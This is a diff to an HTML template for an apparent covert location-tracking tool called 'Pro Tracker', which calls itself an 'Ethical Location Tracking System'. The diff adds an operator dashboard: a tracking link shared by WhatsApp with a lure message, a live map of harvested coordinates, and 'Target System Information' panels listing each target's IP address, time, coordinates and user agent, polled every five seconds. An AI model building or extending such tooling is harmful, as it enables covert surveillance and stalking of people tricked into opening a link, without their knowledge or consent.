@@ -1,51 +1,172 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Haider Afridi - Link Generator</title>
-
+    <title>Haider Afridi - Pro Tracker</title>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+    
     <style>
         body {
-            text-align: center;
             font-family: Arial;
-            margin-top: 80px;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
         }
-
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .link-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
         input {
             width: 400px;
             padding: 10px;
             font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
         }
-
+        
         button {
             padding: 10px 15px;
-            margin: 10px;
+            margin: 5px;
             font-size: 15px;
             cursor: pointer;
+            border: none;
+            border-radius: 4px;
+            background: #007bff;
+            color: white;
         }
-
+        
+        button:hover {
+            background: #0056b3;
+        }
+        
+        #map { 
+            height: 400px; 
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .data-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .target-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        
+        .target-item {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+        
+        .target-item:last-child {
+            border-bottom: none;
+        }
+        
         #msg {
             color: green;
             font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        .stats {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-<h2>🔗 Generate Tracking Link</h2>
-<p>Haider Afridi Ethical Tool</p>
+<div class="container">
+    <div class="header">
+        <h2>🔗 Haider Afridi Pro Tracker</h2>
+        <p>Ethical Location Tracking System</p>
+    </div>
 
-<input type="text" id="linkBox" value="{{link}}" readonly>
+    <div class="link-section">
+        <h3>Generate Tracking Link</h3>
+        <input type="text" id="linkBox" value="{{link}}" readonly>
+        <br><br>
+        <button onclick="copyLink()">📋 Copy Link</button>
+        <button onclick="openLink()">🌐 Open Link</button>
+        <button onclick="newLink()">🔄 New Link</button>
+        <button onclick="sendWhatsApp()">📱 WhatsApp</button>
+        <div id="msg"></div>
+    </div>
 
-<br>
+    <div class="stats">
+        <h3>📊 Tracking Statistics</h3>
+        <p>Total Locations Tracked: <strong id="totalCount">{{data|length}}</strong></p>
+    </div>
 
-<button onclick="copyLink()">📋 Copy Link</button>
-<button onclick="openLink()">🌐 Open Link</button>
-<button onclick="newLink()">🔄 New Link</button>
-<button onclick="sendWhatsApp()">📱 WhatsApp</button>
+    <h3>🗺️ Live Location Map</h3>
+    <div id="map"></div>
 
-<p id="msg"></p>
+    <div class="data-section">
+        <div class="target-info">
+            <h3>🎯 Target System Information</h3>
+            <div id="targetList">
+                {% for location in data %}
+                <div class="target-item">
+                    <strong>ID:</strong> {{location[0]}}<br>
+                    <strong>IP:</strong> {{location[3]}}<br>
+                    <strong>Time:</strong> {{location[5]}}<br>
+                    <strong>Coords:</strong> {{location[1]}}, {{location[2]}}
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+        
+        <div class="target-info">
+            <h3>🔍 User Agent Details</h3>
+            <div id="agentList">
+                {% for location in data %}
+                <div class="target-item">
+                    <strong>{{location[0]}}</strong><br>
+                    <small>{{location[4][:80]}}...</small>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+</div>
 
 <script>
+// Initialize map
+var map = L.map('map').setView([30, 70], 5);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+// Add existing markers
+{% for location in data %}
+    L.marker([{{location[1]}}, {{location[2]}}]).addTo(map)
+      .bindPopup("{{location[0]}} - {{location[5]}}");
+{% endfor %}
+
+// Link functions
 function copyLink() {
     var copyText = document.getElementById("linkBox");
     copyText.select();
@@ -67,6 +188,29 @@ function sendWhatsApp() {
     var msg = "Please open this link: " + link;
     window.open("https://wa.me/?text=" + encodeURIComponent(msg));
 }
+
+// Live updates
+setInterval(function(){
+    fetch('/api/data')
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById('totalCount').textContent = data.locations.length;
+        
+        // Update target list
+        var targetHtml = '';
+        data.locations.forEach(loc => {
+            targetHtml += '<div class="target-item"><strong>ID:</strong> ' + loc[0] + '<br><strong>IP:</strong> ' + loc[3] + '<br><strong>Time:</strong> ' + loc[5] + '<br><strong>Coords:</strong> ' + loc[1] + ', ' + loc[2] + '</div>';
+        });
+        document.getElementById('targetList').innerHTML = targetHtml;
+        
+        // Update agent list
+        var agentHtml = '';
+        data.locations.forEach(loc => {
+            agentHtml += '<div class="target-item"><strong>' + loc[0] + '</strong><br><small>' + loc[4].substring(0, 80) + '...</small></div>';
+        });
+        document.getElementById('agentList').innerHTML = agentHtml;
+    });
+}, 5000);
 </script>
 
 </body>
